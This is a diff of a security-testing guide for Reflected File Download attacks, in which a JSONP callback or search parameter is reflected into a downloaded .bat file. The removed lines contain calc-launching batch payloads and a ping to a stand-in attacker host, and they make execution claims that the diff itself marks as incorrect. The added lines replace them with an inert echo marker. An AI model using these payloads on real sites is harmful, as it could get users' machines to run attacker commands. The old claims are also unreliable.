@@ -127,24 +127,26 @@ curl -s -D - "https://target.example.com/api/data/setup.bat?callback=foo" \
 
 Make the reflected input the first bytes of a valid Windows batch file.
 
-```bash
-# JSONP: the callback is reflected first, so a batch command runs before the
-# parser ever sees the JSON. Saved as setup.bat, this launches calc:
-https://target.example.com/api/data/setup.bat?callback=||calc||
+```text
+# JSONP: test whether a callback can place a VALID batch command first.
+# Use an inert marker and comment out the response suffix:
+https://target.example.com/api/data/setup.bat?callback=echo%20RFD_ORACLE_MARKER%26rem%20
 
 # Resulting downloaded file (setup.bat) content:
-#   ||calc||({"status":"ok", ... })
-# cmd.exe treats ||calc|| as: (run nothing) || calc || (run nothing) => calc runs
+#   echo RFD_ORACLE_MARKER&rem ({"status":"ok", ... })
+# The leading echo runs; rem treats the JSONP suffix as a comment.
+# A leading || has no left operand and fails with a cmd.exe syntax error.
 
 # Reflected-search variant where input lands inside JSON:
 https://target.example.com/api/search/report.bat?q=;calc.exe&&
 # File content:
 #   {"q":";calc.exe&& ...","results":[]}
-# The leading ;calc.exe&& executes; the JSON remainder errors harmlessly.
+# This JSON reflection does NOT by itself form a valid Windows batch command.
+# Semicolon is not a cmd.exe command separator; quoting/context must be proven.
 
 # Batched commands to prove arbitrary execution (use benign markers):
-?callback=||calc%26%26ping%20-n%201%20attacker.oob.example||
-# decoded: ||calc&&ping -n 1 attacker.oob.example||
+?callback=echo%20RFD_ORACLE_MARKER%26rem%20
+# decoded: echo RFD_ORACLE_MARKER&rem
 ```
 
 ### Step 4: Confirm Download Behavior in a Browser
